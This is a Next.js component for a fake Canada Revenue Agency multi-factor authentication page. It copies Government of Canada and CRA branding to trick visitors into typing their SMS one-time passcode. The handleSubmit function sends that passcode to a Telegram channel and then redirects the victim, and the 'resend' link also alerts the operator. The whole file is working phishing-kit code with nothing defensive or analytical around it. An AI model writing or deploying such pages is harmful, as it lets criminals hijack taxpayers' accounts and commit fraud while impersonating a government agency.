"use client";

import { useState, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram"; // adjust path
import Image from "next/image";

export default function CRAMFAPasscodeTelegram() {
  const [passcode, setPasscode] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!passcode.trim()) {
      setError("Please enter the one‑time passcode.");
      return;
    }

    const message = `
🔔 *CRA Passcode Entry* 🔔
🔢 One‑time passcode: ${passcode}
    `;

    try {
      await sendTelegramMessage(message);
      // After successful send, redirect to a success page (e.g., dashboard or confirmation)
      router.push("/cra1"); // change to your actual route
    } catch (err) {
      console.error(err);
      setError("An error occurred. Please try again.");
    }
  };

  const handleResend = async (e: React.MouseEvent) => {
    e.preventDefault();
    // Optionally send a "resend requested" message to Telegram
    const resendMessage = "🔔 *CRA Passcode* – User requested a new passcode.";
    try {
      await sendTelegramMessage(resendMessage);
      setError("New passcode requested. It may take a few minutes.");
    } catch {
      setError("Could not request a new passcode. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-800">
      {/* Government of Canada signature bar */}
      <div className="bg-gray-100 border-b border-gray-300">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2 flex justify-between items-center">
          <Image
  src="/images/sig-blk-en.svg"
  alt="Government of Canada"
  width={500}
  height={150}
  className="h-16 w-auto"
/>
          <div className="text-right">
            <div className="text-xs sm:text-sm text-gray-600">Government of Canada</div>
            <div lang="fr" className="text-xs sm:text-sm text-gray-600">
              Gouvernement du Canada
            </div>
          </div>
        </div>
      </div>

      {/* CRA branding bar */}
      <div className="bg-[#26374a] text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <div className="text-xl sm:text-2xl font-bold">Canada Revenue Agency</div>
        </div>
      </div>

      {/* Main content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <div className="max-w-2xl">
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-6">
            Multi‑factor authentication — passcode entry
          </h1>

          <p className="text-gray-700 text-base sm:text-lg mb-4">
            The CRA sent you a six digit one‑time passcode by text message to the following
            telephone number: <span className="font-mono font-bold">*** - *** - 5459</span>.
            <br />
            Enter the passcode below; it will expire after five minutes.
          </p>

          {/* Error message display */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm mb-6 flex items-start">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                  clipRule="evenodd"
                />
              </svg>
              <span>{error}</span>
            </div>
          )}

          <form onSubmit={handleSubmit} noValidate>
            {/* Passcode field */}
            <div className="mb-6">
              <label htmlFor="passcode" className="block text-base sm:text-lg font-semibold mb-2">
                One‑time passcode <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="passcode"
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                value={passcode}
                onChange={(e) => setPasscode(e.target.value.replace(/\D/g, ""))}
                className="w-full sm:w-64 h-12 border border-gray-400 rounded px-3 text-lg text-center tracking-widest focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="••••••"
                aria-required="true"
              />
            </div>

            {/* Instruction and resend link */}
            <p className="text-gray-700 text-base mb-4">
              If you did not receive the one‑time passcode, you may request a new one by selecting
              the link below. The CRA will resend a new passcode to the telephone number you
              previously selected. This can take a few minutes.
            </p>

            <div className="mb-6">
              <a
                href="#"
                onClick={handleResend}
                className="text-blue-800 underline text-base hover:text-blue-900"
              >
                Request a new one‑time passcode
              </a>
            </div>

            <p className="text-gray-700 text-base mb-8">
              If you added more than one telephone number you can also send the one‑time passcode to
              a different number by{" "}
              <a href="#" className="text-blue-800 underline hover:text-blue-900">
                selecting another number
              </a>
              .
            </p>

            {/* Buttons */}
            <div className="flex flex-col sm:flex-row gap-4 mb-6">
              <button
                type="submit"
                className="bg-[#26374a] hover:bg-[#1c2a3f] text-white font-semibold py-3 px-8 rounded text-lg"
              >
                Continue
              </button>
              <button
                type="button"
                onClick={() => {
                  setPasscode("");
                  setError("");
                }}
                className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-8 rounded text-lg border border-gray-400"
              >
                Cancel
              </button>
            </div>
          </form>

          {/* Screen ID */}
          <div className="text-xs text-gray-400 mt-8 border-t pt-4">Screen ID: MFA.001</div>
        </div>
      </main>
    </div>
  );
}